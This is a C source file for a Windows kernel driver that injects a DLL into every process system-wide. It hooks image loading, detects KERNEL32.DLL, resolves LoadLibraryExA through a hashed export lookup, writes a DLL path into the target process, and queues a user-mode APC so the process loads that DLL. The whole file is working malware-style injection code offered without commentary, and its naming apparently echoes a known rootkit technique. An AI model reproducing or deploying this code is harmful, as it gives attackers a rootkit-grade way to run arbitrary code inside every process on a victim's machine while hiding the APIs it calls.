#include <ntifs.h>
#include <ntddk.h>
#include <ntimage.h>

#include "Sf.h"

GET_ADDRESS Hash = { 0 };

UINT32 HashString(PCHAR pcString)
{
	INT Counter = NULL;
	UINT32 Hash = 0, N = 0;
	while ((Counter = *pcString++))
	{
		Hash ^= ((N++ & 1) == NULL) ? ((Hash << 5) ^ Counter ^ (Hash >> 1)) :
			(~((Hash << 9) ^ Counter ^ (Hash >> 3)));
	}

	return (Hash & 0x7FFFFFFF);
}

PVOID GetProcedureAddressByHash(PVOID ModuleBase,ULONG dwHash, ULONG Data)
{
	PIMAGE_DOS_HEADER ImageDosHeader = (PIMAGE_DOS_HEADER)ModuleBase;
	if (ImageDosHeader->e_magic == IMAGE_DOS_SIGNATURE)
	{
		PIMAGE_NT_HEADERS ImageNtHeaders = ((PIMAGE_NT_HEADERS)(RtlOffsetToPointer(ModuleBase, ImageDosHeader->e_lfanew)));
		if (ImageNtHeaders->Signature == IMAGE_NT_SIGNATURE)
		{
			if (ImageNtHeaders->OptionalHeader.DataDirectory[Data].VirtualAddress && Data < ImageNtHeaders->OptionalHeader.NumberOfRvaAndSizes) {
				PIMAGE_EXPORT_DIRECTORY ImageExport = (((PIMAGE_EXPORT_DIRECTORY)(PUCHAR)RtlOffsetToPointer(ModuleBase, ImageNtHeaders->OptionalHeader.DataDirectory[Data].VirtualAddress)));
				if (ImageExport)
				{
					PULONG AddressOfNames = ((PULONG)RtlOffsetToPointer(ModuleBase, ImageExport->AddressOfNames));
					for (ULONG n = 0; n < ImageExport->NumberOfNames; ++n)
					{
						LPSTR Func = ((LPSTR)RtlOffsetToPointer(ModuleBase, AddressOfNames[n]));
						if (HashString(Func) == dwHash)
						{
							PULONG AddressOfFunctions = ((PULONG)RtlOffsetToPointer(ModuleBase, ImageExport->AddressOfFunctions));
							PUSHORT AddressOfOrdinals = ((PUSHORT)RtlOffsetToPointer(ModuleBase, ImageExport->AddressOfNameOrdinals));
							return ((PVOID)RtlOffsetToPointer(ModuleBase, AddressOfFunctions[AddressOfOrdinals[n]]));

						}
					}

				}
			}
		}
	}
	return NULL;
}

PVOID ResolveDynamicImport(PVOID ModuleBase, ULONG Hash)
{
	return GetProcedureAddressByHash(ModuleBase, Hash,0);
}

VOID NTAPI APCKernelRoutine(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID *SysArg1, PVOID *SysArg2, PVOID *Context)
{
	ExFreePool(Apc);
	return;
}

NTSTATUS DllInject(HANDLE ProcessId, PEPROCESS Peprocess, PETHREAD Pethread, BOOLEAN Alert)
{
	HANDLE hProcess;
	OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES) };
	CLIENT_ID cidprocess = { 0 };
	CHAR DllFormatPath[] = "C:\\MyDLL.dll";
	ULONG Size = strlen(DllFormatPath) + 1;
	PVOID pvMemory = NULL;

	cidprocess.UniqueProcess = ProcessId;
	cidprocess.UniqueThread = 0;
	if (NT_SUCCESS(ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cidprocess)))
	{
		if (NT_SUCCESS(ZwAllocateVirtualMemory(hProcess, &pvMemory, 0, &Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
		{
			KAPC_STATE KasState;
			PKAPC Apc;

			KeStackAttachProcess(Peprocess, &KasState);
			strcpy(pvMemory, DllFormatPath);
			KeUnstackDetachProcess(&KasState);
			Apc = (PKAPC)ExAllocatePool(NonPagedPool, sizeof(KAPC));
			if (Apc)
			{
				KeInitializeApc(Apc, Pethread, 0, (PKKERNEL_ROUTINE)APCKernelRoutine, 0, (PKNORMAL_ROUTINE)Hash.pvLoadLibraryExA, UserMode, pvMemory);
				KeInsertQueueApc(Apc, 0, 0, IO_NO_INCREMENT);
				return STATUS_SUCCESS;
			}
		}
		ZwClose(hProcess);
	}

	return STATUS_NO_MEMORY;
}

VOID SirifefWorkerRoutine(PVOID Context)
{
	DllInject(((PSIRIFEF_INJECTION_DATA)Context)->ProcessId, ((PSIRIFEF_INJECTION_DATA)Context)->Process, ((PSIRIFEF_INJECTION_DATA)Context)->Ethread, FALSE);
	KeSetEvent(&((PSIRIFEF_INJECTION_DATA)Context)->Event, (KPRIORITY)0, FALSE);
	return;
}

VOID NTAPI APCInjectorRoutine(PKAPC Apc, PKNORMAL_ROUTINE *NormalRoutine, PVOID *SystemArgument1, PVOID *SystemArgument2, PVOID* Context)
{
	SIRIFEF_INJECTION_DATA Sf;

	RtlSecureZeroMemory(&Sf, sizeof(SIRIFEF_INJECTION_DATA));
	ExFreePool(Apc);
	Sf.Ethread = KeGetCurrentThread();
	Sf.Process = IoGetCurrentProcess();
	Sf.ProcessId = PsGetCurrentProcessId();
	KeInitializeEvent(&Sf.Event, NotificationEvent, FALSE);
	ExInitializeWorkItem(&Sf.WorkItem, (PWORKER_THREAD_ROUTINE)SirifefWorkerRoutine, &Sf);
	ExQueueWorkItem(&Sf.WorkItem, DelayedWorkQueue);
	KeWaitForSingleObject(&Sf.Event, Executive, KernelMode, TRUE, 0);
	return;
	
}

VOID LoadImageNotifyRoutine(IN PUNICODE_STRING ImageName,IN HANDLE ProcessId, IN PIMAGE_INFO pImageInfo)
{
	if (ImageName != NULL)
	{
		WCHAR kernel32Mask[] = L"*\\KERNEL32.DLL";
		UNICODE_STRING kernel32us;

		RtlInitUnicodeString(&kernel32us, kernel32Mask);
		if (FsRtlIsNameInExpression(&kernel32us, ImageName, TRUE, NULL))
		{
			PKAPC Apc;
			
			if (Hash.Kernel32dll == 0)
			{
				Hash.Kernel32dll = (PVOID)pImageInfo->ImageBase;
				Hash.pvLoadLibraryExA = (fnLoadLibraryExA)ResolveDynamicImport(Hash.Kernel32dll, SIRIFEF_LOADLIBRARYEXA_ADDRESS);
			}

			Apc = (PKAPC)ExAllocatePool(NonPagedPool, sizeof(KAPC));
			if (Apc)
			{
				KeInitializeApc(Apc, KeGetCurrentThread(), 0, (PKKERNEL_ROUTINE)APCInjectorRoutine, 0, 0, KernelMode, 0);
				KeInsertQueueApc(Apc, 0, 0, IO_NO_INCREMENT);
			}
		}
	}

	return;
}


VOID Unload(IN PDRIVER_OBJECT pDriverobject)
{
	PsRemoveLoadImageNotifyRoutine(&LoadImageNotifyRoutine);
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverobject, IN PUNICODE_STRING pRegister)
{
	NTSTATUS st;

	PsSetLoadImageNotifyRoutine(&LoadImageNotifyRoutine);

	pDriverobject->DriverUnload = (PDRIVER_UNLOAD)Unload;

	return STATUS_SUCCESS;
}